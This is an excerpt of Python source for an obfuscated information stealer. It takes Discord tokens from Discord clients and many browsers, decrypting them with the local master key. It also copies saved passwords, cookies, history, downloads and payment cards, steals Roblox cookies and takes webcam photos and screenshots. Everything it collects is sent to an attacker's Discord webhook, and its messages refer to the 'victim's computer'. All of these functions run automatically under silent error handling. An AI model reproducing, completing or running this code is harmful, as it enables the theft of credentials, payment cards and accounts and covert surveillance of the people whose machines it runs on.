...
"""
    ...
    embed = Embed(title=f'System Info {v4r_title_embed}:', color=v4r_color_embed)
...
def D3f_Di5c0rdT0k3n():
    ...
    def D3f_Extr4ctT0k3n5():
        ...
        v4r_paths = {
            'Discord': v4r_path_appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': v4r_path_appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': v4r_path_appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': v4r_path_appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': v4r_path_appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': v4r_path_appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': v4r_path_appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': v4r_path_appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': v4r_path_appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': v4r_path_appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': v4r_path_appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': v4r_path_appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': v4r_path_appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': v4r_path_appdata_local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': v4r_path_appdata_local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': v4r_path_appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': v4r_path_appdata_local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': v4r_path_appdata_local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': v4r_path_appdata_local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': v4r_path_appdata_local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': v4r_path_appdata_local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': v4r_path_appdata_local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': v4r_path_appdata_local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': v4r_path_appdata_local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': v4r_path_appdata_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': v4r_path_appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': v4r_path_appdata_local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        ...
        for v4r_name, v4r_path in v4r_paths.items():
            ...
            if "cord" in v4r_path:
                if not os.path.exists(v4r_path_appdata_roaming + f'\\{v4r__d15c0rd}\\Local State'):
                    continue
                    ...
                    with open(f'{v4r_path}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(v4r_regexp_enc, v4r_line.strip()):
                                v4r_t0k3n = D3f_DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), D3f_GetMasterKey(v4r_path_appdata_roaming + f'\\{v4r__d15c0rd}\\Local State'))
        ...
        if os.path.exists(v4r_path_appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
            for v4r_path, _, v4r_files in os.walk(v4r_path_appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
    ...
    if not v4r_t0k3n5:
        D3f_SendEmbed(
            v4r_w3bh00k_ur1, 
            title=f'Discord Token {v4r_title_embed}:', 
    ...
    for v4r_t0k3n_d15c0rd in v4r_t0k3n5:
        ...
        embed = Embed(title=f'Discord Token {v4r_title_embed}:', color=v4r_color_embed)      
...
def D3f_Br0w53r5t341():
    ...
    def D3f_GetPasswords(v4r_browser, v4r_profile_path, v4r_master_key):
        ...
        disk_conn = sqlite3.connect(v4r_password_db)
        disk_conn.backup(v4r_conn)
        disk_conn.close()
    ...
    def D3f_GetCookies(v4r_browser, v4r_profile_path, v4r_master_key):
        ...
        v4r_conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(v4r_cookie_db)
        disk_conn.backup(v4r_conn)
        disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
    ...
    def D3f_GetHistory(v4r_browser, v4r_profile_path):
        ...
        v4r_conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(v4r_history_db)
        disk_conn.backup(v4r_conn)
        disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
    ...
    def D3f_GetDownloads(v4r_browser, v4r_profile_path):
        ...
        v4r_conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(v4r_downloads_db)
        disk_conn.backup(v4r_conn)
        disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
    ...
    def D3f_GetCards(v4r_browser, v4r_profile_path, v4r_master_key):
        ...
        v4r_conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(v4r_cards_db)
        disk_conn.backup(v4r_conn)
        disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
    ...
    def D3f_WriteFiles(v4r_username_pc):
        files_in_memory = {}

        if v4r_PASSWORDS:
            files_in_memory[f"Passwords_{v4r_username_pc}.txt"] = '\n'.join(v4r_PASSWORDS)

        if v4r_COOKIES:
            files_in_memory[f"Cookies_{v4r_username_pc}.txt"] = '\n'.join(v4r_COOKIES)

        if v4r_HISTORY:
            files_in_memory[f"History_{v4r_username_pc}.txt"] = '\n'.join(v4r_HISTORY)

        if v4r_DOWNLOADS:
            files_in_memory[f"Downloads_{v4r_username_pc}.txt"] = '\n'.join(v4r_DOWNLOADS)

        if v4r_CARDS:
            files_in_memory[f"Cards_{v4r_username_pc}.txt"] = '\n'.join(v4r_CARDS)
    ...
    def D3f_SendFiles(v4r_username_pc, zip_in_memory):
        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
        v4r_w3bh00k.send(
            embed=Embed(
                title=f'Browser Steal {v4r_title_embed}:',
                description=f"Found In **{'**, **'.join(v4r_BROWSERS)}**: ```📂 - Browser_{v4r_username_pc}.zip\n├── 📄 - Cards_{v4r_username_pc}.txt\n├── 📄 - Cookies_{v4r_username_pc}.txt\n├── 📄 - Downloads_{v4r_username_pc}.txt\n├── 📄 - History_{v4r_username_pc}.txt\n└── 📄 - Passwords_{v4r_username_pc}.txt```",
                color=v4r_color_embed,
            ).set_footer(
                text=v4r_footer_text,
                icon_url=v4r_avatar_embed
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{v4r_username_pc}.zip"), 
            username=v4r_username_embed, avatar_url=v4r_avatar_embed
        )
        
    v4r_Browser = {
        'Google Chrome': os.path.join(v4r_path_appdata_local, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(v4r_path_appdata_local, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(v4r_path_appdata_roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(v4r_path_appdata_roaming, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(v4r_path_appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(v4r_path_appdata_local, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(v4r_path_appdata_local, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(v4r_path_appdata_local, 'Amigo', 'User Data'),
        'Torch': os.path.join(v4r_path_appdata_local, 'Torch', 'User Data'),
        'Kometa': os.path.join(v4r_path_appdata_local, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(v4r_path_appdata_local, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(v4r_path_appdata_local, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(v4r_path_appdata_local, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(v4r_path_appdata_local, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(v4r_path_appdata_local, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(v4r_path_appdata_local, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(v4r_path_appdata_local, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(v4r_path_appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(v4r_path_appdata_local, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(v4r_path_appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(v4r_path_appdata_roaming, 'Apple Computer', 'Safari'),
    }

    v4r_Browser_Processes = {
    ...
    try:
        for browser, proc_name in v4r_Browser_Processes.items():
    ...
    for v4r_browser, v4r_path in v4r_Browser.items():
        ...
        for v4r_profile in v4r_profiles:
            ...
            try: D3f_GetPasswords(v4r_browser, v4r_profile_path, v4r_master_key)
            except: pass
            try: D3f_GetCookies(v4r_browser, v4r_profile_path, v4r_master_key)
            except: pass
            try: D3f_GetHistory(v4r_browser, v4r_profile_path)
            except: pass
            try: D3f_GetDownloads(v4r_browser, v4r_profile_path)
            except: pass
            try: D3f_GetCards(v4r_browser, v4r_profile_path, v4r_master_key)
            except: pass

            if v4r_browser not in v4r_BROWSERS:
                v4r_BROWSERS.append(v4r_browser)
            
    if not v4r_PASSWORDS:
        v4r_PASSWORDS.append("No passwords was saved on the victim's computer")
    if not v4r_COOKIES:
        v4r_COOKIES.append("No cookies was saved on the victim's computer")
    if not v4r_HISTORY:
        v4r_HISTORY.append("No history was saved on the victim's computer")
    if not v4r_DOWNLOADS:
        v4r_DOWNLOADS.append("No downloads was saved on the victim's computer")
    if not v4r_CARDS:
        v4r_CARDS.append("No card was saved on the victim's computer")

    zip_in_memory = D3f_WriteFiles(v4r_username_pc)
    D3f_SendFiles(v4r_username_pc, zip_in_memory)
'''
...
def D3f_R0b10xC00ki3():
    ...
    v4r_br0ws3r5 = [D3f_MicrosoftEdge, D3f_GoogleChrome, D3f_Firefox, D3f_Opera, D3f_OperaGX, D3f_Safari, D3f_Brave]
        ...
        if v4r_c00ki3:
            if v4r_c00ki3 not in v4r_c00ki35_list:
                ...
                v4r_embed = discord.Embed(
                    title=f'Roblox Cookie {v4r_title_embed}:',
                    color=v4r_color_embed
                )
...
def D3f_C4m3r4C4ptur3():
    ...
    try:
        ...
        try:
            v4r_path_file_capture = os.path.join(v4r_path_userprofile, 'Documents', v4r_name_file_capture)
            status = C4ptur3(v4r_path_file_capture)
        except:
        ...
        v4r_embed = Embed(title=f"Camera Capture {v4r_title_embed}:", color=v4r_color_embed, description=f"```└── 📷 - {v4r_name_file_capture}```")
        v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
        ...
        D3f_SendEmbed(
            v4r_w3bh00k_ur1, 
            title=f'Camera Capture {v4r_title_embed}:', 
...
def D3f_Op3nU53rPr0fi1353tting5():
    import subprocess
    import time
    try:
...
def D3f_Scr33n5h0t():
    ...
    try:
        ...
        v4r_embed = Embed(title=f"Screenshot {v4r_title_embed}:", color=v4r_color_embed)
        v4r_embed.set_image(url="attachment://screenshot.png")
        v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
        v4r_w3bh00k = SyncWebhook.from_url(v4r_w3bh00k_ur1)
        v4r_w3bh00k.send(
            embed=v4r_embed,
            file=File(v4r_image_bytes, filename="screenshot.png"),
            username=v4r_username_embed,
            avatar_url=v4r_avatar_embed
        )
    except Exception as e:
        D3f_SendEmbed(
            v4r_w3bh00k_ur1, 
            title=f'Screenshot {v4r_title_embed}:', 
...
try: D3f_Di5c0rdT0k3n()
except: pass
try: D3f_Di5c0rdInj3c710n()
except: pass
try: D3f_Br0w53r5t341()
except: pass
try: D3f_R0b10xC00ki3()
except: pass
try: D3f_C4m3r4C4ptur3()
except: pass
try: D3f_Op3nU53rPr0fi1353tting5()
except: pass
try: D3f_Scr33n5h0t()
except: pass
